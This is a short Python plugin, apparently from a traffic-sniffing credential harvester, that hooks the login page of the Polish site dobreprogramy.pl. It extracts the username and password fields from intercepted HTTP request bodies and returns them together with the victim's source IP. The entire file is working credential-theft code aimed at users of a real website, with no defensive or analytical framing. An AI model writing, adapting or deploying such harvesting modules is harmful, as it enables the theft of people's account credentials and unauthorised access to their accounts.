# dobreprogramy
L_HOOKS = dict()
L_HOOKS['url'] = 'dobreprogramy.pl\/Logowanie.html'
L_HOOKS['module'] = 'dobreprogramy.parseDobreprogramy'

def parseDobreprogramy(Headers, ipsrc='', hook=''):
    import re
    User = re.findall("(?i)txtLogin=([A-Za-z0-9_-]+)&(.*)", Headers['body'])
    Passwd = re.findall("(?i)txtPassword=([A-Za-z0-9_-]+)(.*)", Headers['body'])

    if len(User) > 0 and len(Passwd) > 0:
       if len(User[0]) > 0 and len(Passwd[0]) > 0:
           return "[Dobreprogramy.pl]: user="+str(User[0][0])+", passwd="+Passwd[0][0]+", ip="+str(ipsrc)
